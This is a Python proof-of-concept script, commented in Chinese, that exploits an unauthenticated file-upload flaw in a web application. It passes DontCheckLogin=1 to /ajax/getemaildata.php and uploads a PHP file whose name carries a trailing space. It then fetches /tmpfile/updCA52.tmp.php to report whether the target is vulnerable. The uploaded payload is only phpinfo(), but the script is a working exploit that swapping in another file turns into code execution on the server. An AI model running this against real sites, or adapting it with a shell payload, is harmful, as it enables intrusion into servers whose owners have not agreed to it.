import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/ajax/getemaildata.php?DontCheckLogin=1，参数是uid和method',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/ajax/getemaildata.php?DontCheckLogin=1"  # 移除末尾的斜杠
        url1 = args.url[:-1] + "/tmpfile/updCA52.tmp.php"  # 移除末尾的斜杠
    else:
        url = args.url + "/ajax/getemaildata.php?DontCheckLogin=1"
        url1 = args.url + "/tmpfile/updCA52.tmp.php"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------1327449377326679018968432014',
    'Connection': 'close',
    'Origin': 'null',
    'Upgrade-Insecure-Requests': '1'
}

data = '''-----------------------------1327449377326679018968432014
Content-Disposition: form-data; name="file"; filename="a.php "
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------1327449377326679018968432014--'''

response = requests.post(url, headers=headers, data=data)
response1 = requests.get(url1)
if response1.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)

